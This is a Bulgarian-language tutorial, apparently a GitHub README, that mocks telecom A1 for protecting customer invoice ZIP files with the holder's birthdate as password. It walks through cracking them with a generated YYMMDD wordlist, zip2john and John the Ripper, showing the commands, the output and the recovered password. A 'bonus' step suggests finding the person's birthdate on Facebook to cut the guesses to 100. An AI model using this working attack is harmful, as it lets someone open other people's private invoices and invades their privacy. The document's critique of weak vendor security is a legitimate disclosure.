__Как да преодолеете "С оглед сигурност на достъпа до Вашите данни, файлът е защитен с парола, която е рождената Ви дата във формат ГГММДД – последните две цифри от годината на раждане, месец и ден.", измислена от А1 в няколко стъпки.__

Какво ще ви е необходимо:
1) [JohnTheRipper Password cracker](https://www.openwall.com/john/) - За Windows в момента това е версия 1.9.0. Уверете се, че изтеглената версия е Jumbo, трябва ви конвертора zip2john от него (намира се в run/)
    
2) [Файл](https://github.com/nikip72/a1-bg-invoice-bruteforce/raw/main/pass.zip) с генерирани всички възможни пароли, формата е ГГММДД, което означава [00-99][01-12][01-31]. Това прави 37200 комбинации. Да, не всички месеци имат 31 дни, но комбинациите са толкова малко, че това няма никакво значение. Файлът може да бъде генериран по много начини, или да бъде изтеглен от тук, или изтеглен от тук.
    
3) "Защитеният" с парола файл
    
__Стъпка по стъпка указания - в случая използваната ОС е Linux, файла с генерираните пароли се нарича pass.txt, а "защитеният файл" - 0433966193.zip.__

1) Генерирайте хеш за използване от JohnTheRipper с помощта на zip2john
    ```
    $ zip2john ./0433966193.zip > hash
    ver 2.0 0433966193.zip/0433966193.pdf PKZIP Encr: cmplen=652801, decmplen=654165, crc=4B1608B9
    $ ls -la hash
    -rw-r--r-- 1 root root 1305751 Jul 28 06:23 hash
    ```

2) Старирайте JohnTheRipper
     ```
     $ john --wordlist=./pass.txt ./hash
     Using default input encoding: UTF-8
     Loaded 1 password hash (PKZIP [32/64])
     Will run 2 OpenMP threads
     Press 'q' or Ctrl-C to abort, almost any other key for status
     901212           (0433966193.zip/0433966193.pdf)
     1g 0:00:00:00 DONE (2021-07-28 06:25) 12.50g/s 358400p/s 358400c/s 358400C/s 670125..780128
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed
     ```
 Както виждате, почти моментално паролата е намерена - __901212__

3) Разархивирайте супер защитения файл
     ```
     $ unzip 0433966193.zip
     Archive:  0433966193.zip
     [0433966193.zip] 0433966193.pdf password: 
       inflating: 0433966193.pdf
     $ ls -la 0433966193.pdf
     -rw-r--r-- 1 root root 654165 Jul 26 05:49 0433966193.pdf
    ```

4) Бонус 1:
 ако искате да ускорите процеса, не че има накъде, проверете датата на раждане на човека във FB. Евентуално ще трябва да познаете годината само, което свежда комбинациите до 100
5) Бонус 2:
 може да се използва и програмата fcrackzip, която в режим на генериране на пароли само от цифри се справи за 1 мин.
6) Бонус 3:
 позабавлявайте се с оплакване в А1 за да се наслушате как всичко това се прави за вашата сигурност
